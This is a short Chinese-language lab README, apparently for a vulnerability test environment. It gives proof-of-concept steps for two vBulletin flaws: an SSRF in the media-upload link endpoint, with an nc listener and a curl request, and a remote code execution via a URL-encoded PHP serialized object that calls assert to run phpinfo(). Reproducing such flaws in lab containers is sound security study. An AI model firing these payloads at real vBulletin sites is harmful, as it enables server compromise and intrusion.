## vBulletin MEDIA UPLOAD SSRF 漏洞

测试镜像

- src/vbulletin/v5.1.4

影响版本

- vBulletin <= 5.2.2
- vBulletin <= 4.2.3
- vBulletin <= 3.8.9

参考链接

- [vBulletin MEDIA UPLOAD SSRF 漏洞分析](https://paper.seebug.org/24/)

Poc

监听本地端口：

`sudo nc -lvvp 80`

访问地址：

```
curl -d "url=http://172.17.0.1:80/hello_ssrf" "http://172.17.0.2/link/getlinkdata"
```

172.17.0.1为监听的IP地址，172.17.0.2为网站地址



## vBulletin 5 全版本远程代码执行漏洞

测试镜像

- src/vbulletin/v5.1.4

影响版本

- vBulletin 5.1.4-5.1.9

参考链接

- [vBulletin 5 全版本远程代码执行漏洞分析](https://www.anquanke.com/post/id/82870)

Poc

使用`exp.php`生成payload，作为数参数访问：

`http://127.0.0.1/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D`

